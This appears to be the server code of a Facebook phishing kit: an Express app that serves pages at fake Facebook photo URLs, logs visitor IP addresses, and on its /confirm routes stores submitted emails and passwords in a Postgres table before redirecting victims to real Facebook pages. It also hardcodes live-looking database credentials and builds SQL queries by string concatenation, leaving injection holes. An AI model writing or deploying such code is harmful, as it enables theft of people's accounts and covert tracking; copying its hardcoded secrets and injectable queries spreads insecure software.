
var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'haaasalbrddacm',
    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
    database: 'de35u0icb8jt5u',
    port: 5432,
    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
    ssl: true
});
client.connect();
app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572697/735306480197164', function (req, res) {
    res.render('Facebook');
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })

})
app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444', function (req, res) {
    res.render('amir');
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })

})

app.get('/', function (req, res) {
    res.render('Facebook');

    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
    console.log(ip)
})


app.post('/confirm', function (req, res) {
    var a = req.body.email_a;
    var b = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})

app.post('/confirm_amir', function (req, res) {
    res.redirect('https://www.facebook.com/groups/2122333837805164/')
    var a = req.body.email_a;
    var b = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
})
app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445', function (req, res) {
    res.render('fb_ar')
})
// ***********************************************************************************************************************************************
app.get('/fade7a/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/7353064801971644', function (req, res) {

    res.render('fade7a');
})
app.post('/confirm/fad', function () {


    res.redirect('https://www.google.com')
    var a = req.body.email_a;
    var b = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {

    })
})
// ************************************************************************************************************************************************
app.get('*', function (req, res) {
    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
})
app.listen(PORT, function () {
    console.log('Server Started')
})